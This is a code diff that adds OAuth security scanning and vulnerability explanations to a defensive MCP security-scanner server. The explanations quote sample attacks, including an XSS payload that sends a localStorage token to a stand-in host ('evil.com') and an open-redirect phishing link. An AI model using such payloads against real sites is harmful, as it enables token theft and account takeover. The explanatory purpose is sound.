@@ -20,6 +20,7 @@ import { AuthSecurityAnalyzer } from '../src/analyzers/auth-security.js';
 import { APISecurityAnalyzer } from '../src/analyzers/api-security.js';
 import { DependencySecurityAnalyzer } from '../src/analyzers/dependency-security.js';
 import { LiveCVEChecker, ReactSecurityChecker } from '../src/analyzers/live-cve-checker.js';
+import { OAuthSecurityAnalyzer } from '../src/analyzers/oauth-security.js';
 import { ConfigAuditor } from '../src/auditors/config.js';
 import { SafeChecker } from '../src/auditors/safe-checks.js';
 import { Reporter } from '../src/reporters/json-reporter.js';
@@ -118,6 +119,9 @@ class GuardianMCPServer {
 
       case 'explain_vulnerability':
         return await this.explainVulnerability(params);
+
+      case 'scan_oauth_security':
+        return await this.scanOAuthSecurity(params);
 
       // Update tools
       case 'check_for_updates':
@@ -885,6 +889,42 @@ class GuardianMCPServer {
         impact: 'Users unknowingly perform actions like transfers or deletions.',
         fix: 'Use CSRF tokens. Check Origin/Referer headers.',
         difficulty: 'Medium to exploit, medium to fix'
+      },
+      'oauth-csrf': {
+        name: 'OAuth CSRF (Missing State Parameter)',
+        simple: 'Attackers can link their account to your users\' sessions.',
+        how_it_works: 'Without state parameter, attacker initiates OAuth flow, gets their callback URL, tricks victim into visiting it.',
+        example_attack: 'Attacker sends victim link: yoursite.com/callback?code=ATTACKERS_CODE. Victim\'s session gets attacker\'s account linked.',
+        impact: 'Account takeover, data theft, attacker gains access as the victim.',
+        fix: 'Generate random state, store in session before OAuth, verify on callback.',
+        difficulty: 'Medium to exploit, easy to fix'
+      },
+      'open-redirect': {
+        name: 'Open Redirect',
+        simple: 'Your site can be used to redirect users to malicious sites.',
+        how_it_works: 'If redirect URLs aren\'t validated, attackers craft links that appear to be your site but redirect elsewhere.',
+        example_attack: 'yoursite.com/login?redirect=https://evil.com - looks legitimate but goes to phishing site.',
+        impact: 'Phishing attacks, credential theft, malware distribution.',
+        fix: 'Validate redirect URLs against an allowlist of trusted domains.',
+        difficulty: 'Easy to exploit, easy to fix'
+      },
+      'token-storage': {
+        name: 'Insecure Token Storage',
+        simple: 'Auth tokens stored where JavaScript can access them can be stolen.',
+        how_it_works: 'localStorage/sessionStorage tokens can be read by any script, including XSS payloads.',
+        example_attack: 'XSS payload: fetch("evil.com?token="+localStorage.getItem("token"))',
+        impact: 'Session hijacking, account takeover.',
+        fix: 'Store tokens in httpOnly cookies. Use refresh token rotation.',
+        difficulty: 'Requires XSS first, easy to fix'
+      },
+      'pkce': {
+        name: 'Missing PKCE',
+        simple: 'Authorization codes can be intercepted and used by attackers.',
+        how_it_works: 'In SPAs/mobile apps, authorization code can be intercepted. PKCE proves you started the flow.',
+        example_attack: 'Malicious app intercepts redirect, steals auth code, exchanges it for tokens.',
+        impact: 'Account takeover via intercepted authorization codes.',
+        fix: 'Implement PKCE: generate code_verifier, send code_challenge, verify on exchange.',
+        difficulty: 'Medium to exploit, medium to fix'
       }
     };
 
@@ -902,6 +942,39 @@ class GuardianMCPServer {
     return {
       success: true,
       vulnerability: explanation
+    };
+  }
+
+  /**
+   * Scan OAuth/authentication security
+   */
+  async scanOAuthSecurity(params = {}) {
+    console.error(`[Guardian] Scanning OAuth security...`);
+
+    // Detect stack if not already done
+    if (!this.detectedStack) {
+      const stackResult = await this.stackDetector.detect();
+      this.detectedStack = stackResult.stack;
+    }
+
+    const analyzer = new OAuthSecurityAnalyzer(this.projectPath, this.detectedStack);
+    const results = await analyzer.analyze();
+
+    this.findings = [...this.findings, ...results.findings];
+
+    return {
+      success: true,
+      analyzed_providers: results.analyzedProviders,
+      findings_count: results.findings.length,
+      findings: results.findings,
+      summary: results.summary,
+      oauth_checklist: {
+        state_parameter: 'Prevents CSRF attacks during OAuth flow',
+        pkce: 'Required for public clients (SPAs, mobile apps)',
+        token_storage: 'Use httpOnly cookies, not localStorage',
+        redirect_validation: 'Validate redirect URLs against allowlist',
+        secret_management: 'Never expose client secrets to browser'
+      }
     };
   }
 
@@ -1131,6 +1204,11 @@ async function main() {
                       vulnerability_type: { type: 'string', description: 'Type: sql-injection, xss, hardcoded-secrets, nosql-injection, csrf, missing-auth' }
                     }
                   }
+                },
+                {
+                  name: 'scan_oauth_security',
+                  description: 'Scan OAuth/social login implementation for security issues (NextAuth, Clerk, Supabase, Firebase, Auth0, Passport)',
+                  inputSchema: { type: 'object', properties: {} }
                 },
                 // Update tools
                 {
